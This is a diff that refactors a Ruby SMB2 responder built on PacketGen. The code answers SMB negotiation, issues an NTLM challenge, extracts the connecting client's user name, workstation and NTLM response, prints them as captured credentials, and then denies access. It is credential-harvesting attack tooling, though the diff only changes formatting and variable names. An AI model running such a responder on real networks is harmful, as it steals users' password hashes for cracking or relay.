@@ -67,14 +67,19 @@ class Smb2Responder
   end
 
   def smb2_nego_resp1
-    return @pkt if defined? @pkt
+    return @resp1_pkt if defined? @resp1_pkt
 
-    @pkt = PacketGen.gen('NetBIOS::Session')
-                    .add('SMB2', credit: 1)
-                    .add('SMB2::Negotiate::Response', dialect: 0x2ff, server_guid: guid, capabilities: 7, max_trans_size: SMB2_SIZE, max_read_size: SMB2_SIZE, max_write_size: SMB2_SIZE)
-    @pkt.smb2_negotiate_response[:buffer] = PacketGen::Types::String.new.read(SMB2_NEGO_RESP_BUFFER)
-    @pkt.calc
-    @pkt
+    @resp1_pkt = PacketGen.gen('NetBIOS::Session')
+                          .add('SMB2', credit: 1)
+                          .add('SMB2::Negotiate::Response',
+                               dialect: 0x2ff,
+                               server_guid: guid, capabilities: 7,
+                               max_trans_size: SMB2_SIZE,
+                               max_read_size: SMB2_SIZE,
+                               max_write_size: SMB2_SIZE)
+    @resp1_pkt.smb2_negotiate_response[:buffer] = PacketGen::Types::String.new.read(SMB2_NEGO_RESP_BUFFER)
+    @resp1_pkt.calc
+    @resp1_pkt
   end
 
   def first_nego_response
@@ -87,13 +92,20 @@ class Smb2Responder
     smb2_req = req_pkt.smb2
     nego_req = req_pkt.smb2_negotiate_request
 
-    pkt = PacketGen.gen('NetBIOS::Session').add('SMB2', credit: 1, message_id: smb2_req.message_id, reserved: smb2_req.reserved)
-
-    pkt.add('SMB2::Negotiate::Response', dialect: nego_req.dialects.last,
-            server_guid: guid, capabilities: 0x2f, max_trans_size: SMB2_SIZE,
-            max_read_size: SMB2_SIZE, max_write_size: SMB2_SIZE)
-    pkt.smb2_negotiate_response[:system_time] = PacketGen::Plugin::SMB::Filetime.now
-    pkt.smb2_negotiate_response[:buffer] = PacketGen::Types::String.new.read(SMB2_NEGO_RESP_BUFFER)
+    pkt = PacketGen.gen('NetBIOS::Session')
+                   .add('SMB2',
+                        credit: 1,
+                        message_id: smb2_req.message_id,
+                        reserved: smb2_req.reserved)
+                   .add('SMB2::Negotiate::Response',
+                        dialect: nego_req.dialects.last,
+                        server_guid: guid,
+                        capabilities: 0x2f,
+                        max_trans_size: SMB2_SIZE,
+                        max_read_size: SMB2_SIZE,
+                        max_write_size: SMB2_SIZE,
+                        system_time: PacketGen::Plugin::SMB::Filetime.now,
+                        buffer: PacketGen::Types::String.new.read(SMB2_NEGO_RESP_BUFFER))
 
     pkt.smb2_negotiate_response.context_list << { type: 1, salt_length: SMB2_SALT_LEN, salt: salt }
     pkt.smb2_negotiate_response.context_list.last.hash_alg << PacketGen::Types::Int16le.new(1)
@@ -110,9 +122,13 @@ class Smb2Responder
     ntlm_nego = PacketGen::Plugin::NTLM.read(setup_req.buffer[:token_init][:mech_token].value)
 
     pkt = PacketGen.gen('NetBIOS::Session')
-    pkt.add('SMB2', credit_charge: 1, credit: 1, status: STATUS_MORE_PROCESSING_REQUIRED,
-                    message_id: smb2_req.message_id, reserved: smb2_req.reserved)
-    pkt.add('SMB2::SessionSetup::Response')
+                   .add('SMB2',
+                        credit_charge: 1,
+                        credit: 1,
+                        status: STATUS_MORE_PROCESSING_REQUIRED,
+                        message_id: smb2_req.message_id,
+                        reserved: smb2_req.reserved)
+                   .add('SMB2::SessionSetup::Response')
 
     ntlm = PacketGen::Plugin::NTLM::Challenge.new
     ntlm.flags = ntlm_nego.flags | 0x00810000
@@ -127,20 +143,28 @@ class Smb2Responder
     ntlm.target_info << { type: 'Timestamp', value: PacketGen::Plugin::SMB::Filetime.now.to_human }
     ntlm.target_info << { type: 'EOL' }
     ntlm.calc_length
+
     gssapi = pkt.smb2_sessionsetup_response.buffer
     gssapi[:token_resp][:response].value = ntlm.to_s
     gssapi[:token_resp][:negstate].value = 'accept-incomplete'
     gssapi[:token_resp][:supported_mech] = NTLMSSP_OID
+
     pkt.calc
+
     [pkt, ntlm.challenge]
   end
 
   def deny_access(req_pkt)
     smb2_req = req_pkt.smb2
     pkt = PacketGen.gen('NetBIOS::Session')
-    pkt.add('SMB2', credit: 1, credit_charge: 1, status: STATUS_ACCESS_DENIED,
-                    message_id: smb2_req.message_id, reserved: smb2_req.reserved)
-    pkt.add('SMB2::SessionSetup::Response')
+                   .add('SMB2',
+                        credit: 1,
+                        credit_charge: 1,
+                        status: STATUS_ACCESS_DENIED,
+                        message_id: smb2_req.message_id,
+                        reserved: smb2_req.reserved)
+                   .add('SMB2::SessionSetup::Response')
+    # Remove buffer
     pkt.smb2_sessionsetup_response[:buffer] = PacketGen::Types::String.new
     pkt.calc
     pkt
@@ -149,20 +173,20 @@ class Smb2Responder
   def start_loop
     loop do
       client = socket.accept
-      closed = false
+      to_close = false
 
       log "connection from #{client.peeraddr[2]}"
 
       credentials = Credentials.new
       credentials.ip = client.peeraddr.last
 
-      until closed
+      until to_close
         rcv_pkt = get_smb_data(client)
 
         pkt_to_send = case rcv_pkt.headers.last.protocol_name
                       when 'SMB::Negotiate::Request'
                         unless rcv_pkt.smb_negotiate_request.dialects.map(&:to_human).include?('SMB 2.???')
-                          closed = true
+                          to_close = true
                           nil
                         end
 
@@ -184,21 +208,19 @@ class Smb2Responder
                             credentials.user = response.user_name
                             credentials.computer = response.workstation
                             credentials.response = binary2hex(response.nt_response.to_s[response.nt_response[:response].sz..-5])
-                            closed = true
+                            to_close = true
                             deny_access rcv_pkt
                           else
-                            closed = true
+                            to_close = true
                             nil
                           end
                         end
                       end
 
         client.send(pkt_to_send.to_s, 0) if pkt_to_send
-        client.close if closed
+        client.close if to_close
 
-        unless credentials.response.nil?
-          puts credentials.to_s
-        end
+        puts credentials.to_s unless credentials.response.nil?
       end
     end
   end
